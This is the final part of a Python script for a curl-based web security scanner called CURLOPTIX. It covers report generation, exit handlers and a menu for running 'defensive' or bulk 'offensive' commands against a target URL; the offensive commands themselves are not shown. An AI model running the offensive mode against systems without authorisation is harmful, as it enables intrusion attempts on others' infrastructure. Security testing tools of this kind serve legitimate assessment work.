                    "findings": [
                        {
                            "severity": f.severity.value,
                            "cwe_id": f.cwe_id,
                            "title": f.title,
                            "description": f.description,
                            "remediation": f.remediation,
                            "impact": f.impact,
                            "likelihood": f.likelihood,
                            "confidence": f.confidence,
                            "evidence": f.evidence,
                            "recommended_action": f.recommended_action,
                            "risk_score": f.risk_score
                        }
                        for f in r.findings
                    ],
                    "response_headers": r.response_headers,
                    "ssl_info": r.ssl_info,
                    "payload_size": r.payload_size
                }
                for r in results
            ]
        }
        
        with open(json_file, "w") as f:
            json.dump(report_data, f, indent=2)
        
        with open(txt_file, "w") as f:
            f.write("="*100 + "\n")
            f.write("CURLOPTIX ASSESSMENT REPORT\n")
            f.write("="*100 + "\n\n")
            f.write(f"Target: {target}\n")
            f.write(f"Timestamp: {datetime.now().isoformat()}\n")
            f.write(f"Total Tests: {len(results)}\n")
            f.write(f"Total Findings: {total_findings}\n\n")
            f.write("="*100 + "\n\n")
            
            for idx, r in enumerate(results, 1):
                f.write(f"\n{'─'*100}\n")
                f.write(f"TEST #{idx}: {r.command.name}\n")
                f.write(f"{'─'*100}\n")
                f.write(f"Category: {r.command.category}\n")
                f.write(f"Purpose: {r.command.test_purpose}\n")
                f.write(f"Status: {r.status}\n")
                f.write(f"Exit Code: {r.exit_code}\n")
                f.write(f"Duration: {r.duration:.3f}s\n")
                f.write(f"HTTP Status: {r.http_status}\n")
                f.write(f"Risk Level: {r.risk_level}\n")
                f.write(f"Vulnerability Detected: {r.vulnerability_detected}\n\n")
                
                f.write("STDOUT (Full):\n")
                f.write("-"*50 + "\n")
                f.write(r.stdout if r.stdout else "[EMPTY]\n")
                f.write("\nSTDERR (Full):\n")
                f.write("-"*50 + "\n")
                f.write(r.stderr if r.stderr else "[NONE]\n")
                f.write("\n")
                
                if r.response_headers:
                    f.write("RESPONSE HEADERS:\n")
                    f.write("-"*50 + "\n")
                    for key, value in r.response_headers.items():
                        f.write(f"{key}: {value}\n")
                
                if r.ssl_info:
                    f.write("\nSSL/TLS INFORMATION:\n")
                    f.write("-"*50 + "\n")
                    for key, value in r.ssl_info.items():
                        f.write(f"{key}: {value}\n")
                
                if r.findings:
                    f.write(f"\nFINDINGS ({len(r.findings)}):\n")
                    f.write("-"*50 + "\n")
                    for fi, finding in enumerate(r.findings, 1):
                        f.write(f"\n  Finding #{fi}:\n")
                        f.write(f"  Severity: {finding.severity.value}\n")
                        f.write(f"  Title: {finding.title}\n")
                        f.write(f"  Description: {finding.description}\n")
                        f.write(f"  Impact: {finding.impact}\n")
                        f.write(f"  Remediation: {finding.remediation}\n")
                        f.write(f"  Risk Score: {finding.risk_score:.1f}/10.0\n")
                        f.write(f"  Evidence: {finding.evidence}\n\n")
                f.write("\n" + "="*100 + "\n")
        
        import csv
        with open(csv_file, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([
                "Command", "Category", "Purpose", "Status", "Exit Code", "Duration",
                "HTTP Status", "Vulnerability", "Risk Level", "Findings Count",
                "CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO", "Max Risk Score",
                "Stdout Length", "Stderr Length"
            ])
            for r in results:
                critical = sum(1 for f in r.findings if f.severity == Severity.CRITICAL)
                high = sum(1 for f in r.findings if f.severity == Severity.HIGH)
                medium = sum(1 for f in r.findings if f.severity == Severity.MEDIUM)
                low = sum(1 for f in r.findings if f.severity == Severity.LOW)
                info = sum(1 for f in r.findings if f.severity == Severity.INFO)
                max_risk = max([f.risk_score for f in r.findings]) if r.findings else 0
                
                writer.writerow([
                    r.command.name,
                    r.command.category,
                    r.command.test_purpose[:100],
                    r.status,
                    r.exit_code,
                    f"{r.duration:.3f}",
                    r.http_status,
                    r.vulnerability_detected,
                    r.risk_level,
                    len(r.findings),
                    critical, high, medium, low, info,
                    f"{max_risk:.1f}",
                    len(r.stdout),
                    len(r.stderr)
                ])
        
        console.print(f"\n[green]Reports saved successfully:[/green]")
        console.print(f"  [cyan]JSON:[/cyan] {json_file}")
        console.print(f"  [cyan]TXT:[/cyan] {txt_file}")
        console.print(f"  [cyan]CSV:[/cyan] {csv_file}")
        
    except Exception as e:
        console.print(f"[yellow]Could not save reports: {e}[/yellow]")
        console.print("[yellow]Results are still displayed above[/yellow]")
    
    console.print(f"\n[bold green]Assessment Complete![/bold green]")
    Prompt.ask("\n[cyan]Press Enter to continue[/cyan]")

def signal_handler(sig, frame):
    print(f"\n{YELLOW}⚠️ Interrupted by user{RESET}")
    lock_and_redirect()
    sys.exit(0)

def main():
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTSTP, signal_handler)
    
    console.clear()
    console.print(ASCII_BANNER, style="bold cyan")
    console.print(BANNER, style="bold cyan")
    
    warning_panel = Panel(
        "[yellow]⚠ WARNING[/yellow]\n"
        "CURLOPTIX is intended ONLY for systems, domains and infrastructure\n"
        "that you own or have explicit authorization to assess.\n\n"
        "This tool contains 400+ powerful cybersecurity assessment commands.\n\n"
        "Unauthorized scanning, probing or exploitation may be illegal.\n"
        "[red]Use responsibly. The author assumes NO LIABILITY.[/red]",
        border_style="red",
        title="[bold red]⚠ LEGAL NOTICE[/bold red]"
    )
    console.print(warning_panel)
    
    if len(sys.argv) < 2:
        target = Prompt.ask("\n[cyan]Enter target URL[/cyan]")
    else:
        target = sys.argv[1]
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    console.print(f"\n[green]Target: {target}[/green]")
    console.print("[cyan]Loaded 400+ Cybersecurity Commands[/cyan]")
    console.print("[dim]Press Ctrl+C or Ctrl+Z to exit safely[/dim]")
    
    generator = CommandGenerator()
    
    while True:
        console.clear()
        console.print(ASCII_BANNER, style="bold cyan")
        
        menu = """
╔══════════════════════════════════════════════════════════════╗
║                    SELECT COMMAND MODE                      ║
╠══════════════════════════════════════════════════════════════╣
║  [1] Defensive Commands - Browse & Select                   ║
║  [2] Offensive Commands - Browse & Select                   ║
║  [3] All Commands - Browse & Select                         ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║  [A] Run All Defensive Commands                            ║
║  [B] Run All Offensive Commands                            ║
║  [C] Run All Commands                                      ║
║                                                              ║
╠══════════════════════════════════════════════════════════════╣
║  [D] Detailed Command Info                                 ║
║  [Q] Quit                                                  ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""
        console.print(menu)
        
        choice = Prompt.ask("\n[cyan]Enter your choice[/cyan]", choices=["1", "2", "3", "A", "B", "C", "D", "Q"])
        
        if choice.upper() == "Q":
            console.print("[green]Exiting CURLOPTIX...[/green]")
            lock_and_redirect()
            sys.exit(0)
        
        defensive_cmds = generator.generate_defensive()
        offensive_cmds = generator.generate_offensive()
        all_cmds = defensive_cmds + offensive_cmds
        
        console.print(f"[cyan]Available: Defensive={len(defensive_cmds)}, Offensive={len(offensive_cmds)}, Total={len(all_cmds)}[/cyan]")
        
        if choice == "D":
            cmd_name = Prompt.ask("[cyan]Enter command name to get details[/cyan]")
            found = False
            for cmd in all_cmds:
                if cmd.name.lower() == cmd_name.lower():
                    console.print(Panel(
                        f"[yellow]Name:[/yellow] {cmd.name}\n"
                        f"[yellow]Category:[/yellow] {cmd.category}\n"
                        f"[yellow]Purpose:[/yellow] {cmd.test_purpose}\n"
                        f"[yellow]Description:[/yellow] {cmd.description}\n"
                        f"[yellow]Command:[/yellow] curl {' '.join(cmd.cmd)}",
                        title="[bold cyan]COMMAND DETAILS[/bold cyan]",
                        border_style="blue"
                    ))
                    found = True
                    Prompt.ask("[cyan]Press Enter to continue[/cyan]")
                    break
            if not found:
                console.print(f"[red]Command '{cmd_name}' not found[/red]")
                Prompt.ask("[cyan]Press Enter to continue[/cyan]")
            continue
        
        if choice == "1":
            selected = select_specific_commands(defensive_cmds, "Defensive")
        elif choice == "2":
            selected = select_specific_commands(offensive_cmds, "Offensive")
        elif choice == "3":
            selected = select_specific_commands(all_cmds, "All")
        elif choice.upper() == "A":
            selected = defensive_cmds
            console.print(f"[green]Selected all {len(selected)} defensive commands[/green]")
        elif choice.upper() == "B":
            selected = offensive_cmds
            console.print(f"[green]Selected all {len(selected)} offensive commands[/green]")
        elif choice.upper() == "C":
            selected = all_cmds
            console.print(f"[green]Selected all {len(selected)} commands[/green]")
        else:
            continue
        
        if not selected:
            console.print("[yellow]No commands selected[/yellow]")
            continue
        
        console.print(f"\n[cyan]Selected {len(selected)} commands for assessment[/cyan]")
        
        if not Confirm.ask("[yellow]Start assessment?[/yellow]"):
            console.print("[red]Aborted[/red]")
            continue
        
        try:
            response = requests.head(target, timeout=5)
            console.print(f"[green]Target reachable (Status: {response.status_code})[/green]")
        except:
            console.print(f"[yellow]Target may be unreachable, continuing anyway...[/yellow]")
        
        console.clear()
        console.print("[bold cyan]╔══════════════════════════════════════════════════════════════════╗[/bold cyan]")
        console.print("[bold cyan]║                    EXECUTING TESTS                              ║[/bold cyan]")
        console.print("[bold cyan]╚══════════════════════════════════════════════════════════════════╝[/bold cyan]")
        console.print("[dim]Press Ctrl+C or Ctrl+Z to stop and exit[/dim]")
        
        engine = CurlEngine(target, timeout=30, concurrency=10, verbose=False)
        results = engine.run_scan(selected)
        
        display_results(results, target)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}⚠️ Interrupted by user{RESET}")
        lock_and_redirect()
        sys.exit(0)
    except Exception as e:
        console.print(f"[red]Fatal error: {str(e)}[/red]")
        lock_and_redirect()
        sys.exit(1)
